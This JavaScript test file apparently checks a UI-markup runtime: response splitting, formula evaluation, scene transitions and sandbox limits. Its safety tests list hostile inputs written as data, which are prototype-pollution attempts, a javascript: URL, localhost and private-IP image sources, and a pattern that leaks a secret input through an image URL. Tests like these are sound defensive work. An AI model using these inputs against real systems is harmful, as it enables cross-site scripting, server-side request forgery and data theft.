import test from 'node:test';import assert from 'node:assert/strict';
import {examples} from '../src/catalog.mjs';
import {compile,evaluateDocument,safeEvaluate,safePublicURL} from '../src/runtime/evaluate.mjs';
import {splitResponse} from '../src/protocol/split.mjs';
import {collectDefaults} from '../src/runtime/defaults.mjs';
import {sceneTransition,sceneView,initialScene} from '../src/runtime/scene.mjs';
test('mixed Markdown fences preserve source and ignore nested code, every streaming prefix terminates',()=>{
  const ui='root = Stack([Text("你好🌏")])\n';const raw='Before\n```openui\n'+ui+'```\nMiddle\n````md\n```openui\nignored\n```\n````\n~~~intelligent-ui\nroot = Text("ok")\n~~~\nAfter';
  const parts=splitResponse(raw);assert.deepEqual(parts.filter(x=>x.kind==='ui').map(x=>x.text),[ui,'root = Text("ok")\n']);assert.equal(parts.at(-1).text,'After');
  for(let i=0;i<=raw.length;i++){const p=splitResponse(raw.slice(0,i),{streaming:true});assert.ok(p.length<10);assert.ok(p.filter(x=>x.kind==='ui').every(x=>typeof x.complete==='boolean'));}
});
test('complete component examples compile and validate actual props',()=>{assert.ok(examples.length>=10);for(const source of examples){const d=compile(source),root=evaluateDocument(d);assert.ok(root.name);assert.doesNotThrow(()=>collectDefaults(root));}});
test('protocol marker and line comments preserve text and compile without being counted as declarations',()=>{const raw='// iui:1\n// a comment with unmatched ( [ "\nroot = Text("🎮 https://example.com/a // text") // trailing comment 🪄\n';const doc=compile(raw);assert.equal(doc.source,raw);assert.equal(evaluateDocument(doc).props.text,'🎮 https://example.com/a // text');assert.throws(()=>compile('// iui:2\nroot = Text("x")'),/协议版本/);});
test('independent financial formulas and live variables',()=>{assert.ok(Math.abs(safeEvaluate('bill * (1 + tip / 100) / people',{bill:360,tip:10,people:4})-99)<1e-10);assert.ok(Math.abs(safeEvaluate('principal * pow(1 + rate / 100, years)',{principal:10000,rate:3,years:5})-11592.740743)<1e-6);assert.equal(safeEvaluate('count(filter(range(10), n, n % 2 == 0))'),5);assert.equal(safeEvaluate('sum(each([2,3,4], n, n*n))'),29);});
test('malicious source is rejected before work can escape bounded execution',()=>{
  const attacks=['root = Text($x.constructor)','root = Text({__proto__:1})','root = Query("bash",{})','root = Text(foo)\nfoo = bar\nbar = foo','root = Text("bad") trailing','root = Stack([Text("bad")})','root = Text('+ '-'.repeat(60)+'1)','root = Text('+ '('.repeat(60)+'1'+')'.repeat(60)+')','root = Text(Range(100000000))','root = Stack(Each(Range(1000), n, Each(Range(1000), m, Text("x"))))','root = Text(1/0)'];
  for(const source of attacks)assert.throws(()=>evaluateDocument(compile(source)),undefined,source);
  assert.throws(()=>safeEvaluate('globalThis.fetch("https://example.com")'));assert.throws(()=>safeEvaluate('1 ignored'));assert.throws(()=>safeEvaluate('rand()'));
  assert.throws(()=>evaluateDocument(compile('root = Stack([{name:"Image",props:{src:"http://127.0.0.1/private",alt:"forged"},path:"forged"}])')));
});
test('dynamic props receive same schema bounds as literals and image resources are static public URLs',()=>{
  assert.throws(()=>evaluateDocument(compile('root = Slider("x","x",$n,0,10,0)\n$n=1')));
  for(const url of ['javascript:alert(1)','https://localhost/a','https://127.0.0.1/a','https://192.168.0.1/a','https://user:password@example.com/a','https://host.internal/a'])assert.throws(()=>safePublicURL(url));
  assert.throws(()=>evaluateDocument(compile('root = Image($url,"x")\n$url="https://example.com/x.png"')));
  assert.throws(()=>evaluateDocument(compile('$secret = \"\"\nroot = Stack([Input(\"Secret\",\"secret\",\"\"),Image(concat(\"https://example.com/pixel?value=\",secret),\"x\")])'),{secret:'PRIVATE_INPUT'}));
  assert.equal(safePublicURL('https://example.com/a.png'),'https://example.com/a.png');
});
test('generic scene is deterministic, transactional and numerically bounded',()=>{
  const scene={initial:{x:10,score:0},seed:7,events:{click:[{name:'score',value:'score+1'},{name:'x',value:'rand()*100'}],tick:[{name:'x',value:'x + 10 * event.dt'}]},marks:[{id:'ball',type:'circle',x:{expr:'x'},y:10,r:5,fill:'blue'}],width:200,height:100};
  const original=initialScene(scene),a=sceneTransition(scene,original,'click'),b=sceneTransition(scene,original,'click');assert.deepEqual(a,b);assert.equal(original.values.score,0);assert.equal(a.values.score,1);assert.ok(a.values.x>=0&&a.values.x<100);
  const moved=sceneTransition(scene,a,'tick',{dt:10});assert.equal(moved.values.x,a.values.x+1);assert.equal(sceneView(scene,moved).marks[0].x,moved.values.x);
  assert.throws(()=>sceneTransition({...scene,events:{click:[{name:'x',value:'1/0'}]}},original,'click'));assert.equal(original.values.x,10);
  const big={initial:{data:[]},events:{click:[{name:'data',value:'each(range(4),i,range(2000))'}]},marks:[],width:200,height:100};assert.throws(()=>sceneTransition(big,initialScene(big),'click'));assert.deepEqual(sceneTransition(big,{values:{data:Array.from({length:4},()=>Array(2000).fill(1))},seed:1},'reset'),initialScene(big));
});
